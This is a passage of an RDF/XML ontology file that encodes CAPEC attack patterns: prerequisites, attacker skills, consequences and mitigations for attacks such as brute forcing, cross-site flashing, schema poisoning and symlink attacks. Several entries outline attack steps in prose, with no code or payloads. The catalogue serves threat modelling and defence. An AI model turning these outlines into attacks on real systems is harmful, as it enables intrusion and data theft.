      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application uses data access layer generated by an ORM tool or framework::An application uses user supplied data in queries executed against the database::The separation between data plane and control plane is not ensured  through either developer error or an underlying weakness in the data access layer code generation framework::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker153">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#590">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:603::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#IP Address Blocking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack153">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#590"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::300::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Blocking packets intended for a target IP address denies its availability to the user.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker40">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#548"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack40"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker151">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#546">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:545::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Probe Application Memory"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack151">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#546"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful attack that probes application memory will compromise the confidentiality of that data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The cloud provider must not assuredly delete part or all of the sensitive data for which they are responsible.The adversary must have the ability to interact with the system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary requires the ability to traverse directory structure.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker285">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#569"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack285"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker152">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#65"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack152"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::319::311::318::693::719::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have the ability to place himself in the communication path between the client and server.::The targeted application must receive some application code from the server; for example  dynamic updates  patches  applets or scripts.::The attacker must be able to employ a sniffer on the network without being detected.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ a man-in-the-middle attack  the client or server must not realize this. Finally  the attacker needs to regenerate source code from binary code if the need be.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The Attacker needs the ability to capture communications between the client being updated and the server providing the update. In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker283">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#178">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:182::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cross-Site Flashing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack283">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#178"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identification) Using a browser or an automated tool  an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).TECHNIQUE:Use an automated tool to record the variables passed to a flash file.:TECHNIQUE:Use a browser to manually explore the website and analyze how the flash file receive variables  e.g. JavaScript using SetVariable/GetVariable  HTML FlashVars param tag  etc.:TECHNIQUE:Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt to inject a remote flash file) The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.TECHNIQUE:Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.::STEP:3:PHASE:Exploit:DESCRIPTION:(Access or Modify Flash Application Variables) As the attacker succeeds in exploiting the vulnerability  he targets the content of the flash application to steal variable content  password  etc.TECHNIQUE:Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser&apos;s flash plugin and sends document information to the attacker.:TECHNIQUE:Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the flash application to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Execute JavaScript in victim&apos;s browser) When the attacker targets the current flash application  he can choose to inject JavaScript in the client&apos;s DOM and therefore execute cross-site scripting attack.TECHNIQUE:Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:knowledge of Flash internals  parameters and remote referencing.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker150">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#639">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:545::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Probe System Files"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack150">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#639"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::552::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::552::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary has access to the file system of a system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Implement message level security such as HMAC in the HTTP communication::Design: Utilize defense in depth  do not rely on a single security mechanism like SSL::Design: Enforce principle of least privilege::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack477">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#57">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:157::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Utilizing REST&apos;s Trust in the System Resource to Obtain Sensitive Data"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::300::287::724::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker42">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#146">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:271::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Schema Poisoning"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack42">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#146"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::15::472::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful schema poisoning attack can compromise the availability of the target system&apos;s service by exhausting its available resources.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::15::472::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Some level of access to modify the target schema.::The schema used by the target application must be improperly secured against unauthorized modification and manipulation.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker284">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#466">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:94::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Leveraging Active Man in the Middle Attacks to Bypass Same Origin Policy"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack284">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#466"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::300::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim and the attacker are both in an environment where an active man in the middle attack is possible (e.g.  public WIFI hot spot)The victim visits at least one website that does not use TLS / SSL::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to intercept and modify requests / responses:LEVEL:Low::SKILL:Ability to create iFrame and JavaScript code that would initiate unauthorized requests to sensitive sites from the victim&apos;s browser:LEVEL:Medium::SKILL:Solid understanding of the HTTP protocol:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker282">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#470">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:66::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Expanding Control over the Operating System from the Database"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack282">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#470"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::250::89::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::250::89::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A vulnerable DBMS is usedA SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Low level knowledge of the various facilities available in different DBMS systems for interacting with the file system and operating system:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker41">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#271">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:176::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Schema Poisoning"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack41">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#271"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::15::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful schema poisoning attack can compromise the availability of the target system&apos;s service by exhausting its available resources.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::15::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Some level of access to modify the target schema.::The schema used by the target application must be improperly secured against unauthorized modification and manipulation.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker56">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#410"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack56"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage anti-virus products to detect and quarantine software with known virus.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack180"/>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack27">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#442">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:441::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Infected Software"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging  that is every once in a while a new password must be chosen.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack387">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#49">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:112::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Password Brute Forcing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::521::262::263::257::693::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine application&apos;s/system&apos;s password policy) Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers  special characters  etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Exploit:DESCRIPTION:(Brute force password) Given the finite space of possible passwords dictated by the password policy determined in the previous step  try all possible passwords for a known user ID until application/system grants access.TECHNIQUE:Manually or automatically enter all possible passwords through the application/system&apos;s interface. In most systems  start with the shortest and simplest possible passwords  because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Perform an offline dictionary attack or a rainbow table attack against a known password hash.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::It is important to protect WSDL file or provide limited access to it.::Review the functions exposed by the WSDL interface (especially if you have used a tool to generate it). Make sure that none of them is vulnerable to injection.::Ensure the WSDL does not expose functions and APIs that were not intended to be exposed.::Pay attention to the function naming convention (within the WSDL interface). Easy to guess function name may be an entry point for attack.::Validate the received messages against the WSDL Schema. Incomplete solution.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack474">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#95">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:54::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#WSDL Scanning"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::538::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The first step is exploratory meaning the attacker scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details  purpose  functional break down  entry points  message types  etc.). This is very useful information for the attacker.::STEP:2:PHASE:Experiment:DESCRIPTION:The second step that an attacker would undertake is to analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The attacker could run through all of the operations with different message request patterns until a breach is identified.::STEP:3:PHASE:Exploit:DESCRIPTION:Once an attacker finds a potential weakness  they can craft malicious content to be sent to the system. For instance the attacker may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the attacker may not be XML validated and cause unexpected behavior.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker55">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#63"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack55"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target client software must be a client that allows scripting communication from remote hosts  such as a JavaScript-enabled Web Browser.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a redirection and use of less trusted source  an attacker can simply place a script in bulletin board  blog  wiki  or other user-generated content site that are echoed back to other client machines.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser&apos;s executable process.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Check for the existence of files to be created  if in existence verify they are neither symlinks nor hard links before opening them.::Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack316">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#132">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:159::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Symlink Attack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::59::"/>
        </j.0:exploits>
        <j.0:executes>
